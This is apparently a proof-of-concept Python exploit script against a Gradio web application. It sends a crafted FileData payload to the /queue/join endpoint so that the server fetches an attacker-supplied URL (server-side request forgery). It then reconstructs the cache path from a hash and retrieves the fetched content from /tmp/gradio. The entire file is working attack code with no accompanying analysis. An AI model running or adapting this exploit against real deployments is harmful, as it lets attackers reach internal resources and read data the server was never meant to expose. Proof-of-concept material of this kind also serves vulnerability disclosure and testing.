import requests
import json
import sys
import hashlib
import time

if len(sys.argv) != 2:
    print("Usage: python poc.py <URL>")
    sys.exit(1)

ssrf_dst = sys.argv[1]
print(f"Targeting URL: {ssrf_dst}")

# Use the Docker network IP
base_url = "http://172.23.0.1:7860"  # Use the Docker bridge network gateway
url = f"{base_url}/queue/join?"
headers = {
    "Content-Type": "application/json"
}
data = {
    "data": [
        [
            {
                "meta": {"_type": "gradio.FileData"},
                "path": ssrf_dst
            }
        ]
    ],
    "event_data": None,
    "fn_index": 11,
    "trigger_id": 2,
    "session_hash": "l8v6ku4cm8d"
}
print(f"Sending request to: {url}")

try:
    response = requests.post(url, headers=headers, data=json.dumps(data))
    print(f"Initial response status: {response.status_code}")
except Exception as e:
    print(f"Error in initial request: {e}")

time.sleep(2)

sha1 = hashlib.sha256()
sha1.update(ssrf_dst.encode('utf-8'))
hash_value = sha1.hexdigest()

url = f"{base_url}/file=/tmp/gradio/{hash_value}/{ssrf_dst.split('/')[-1]}"
print(f"Requesting file from: {url}")

try:
    response = requests.get(url)
    print(f"Final response status: {response.status_code}")
    print(f"Response content: {response.text}")
except Exception as e:
    print(f"Error in file request: {e}")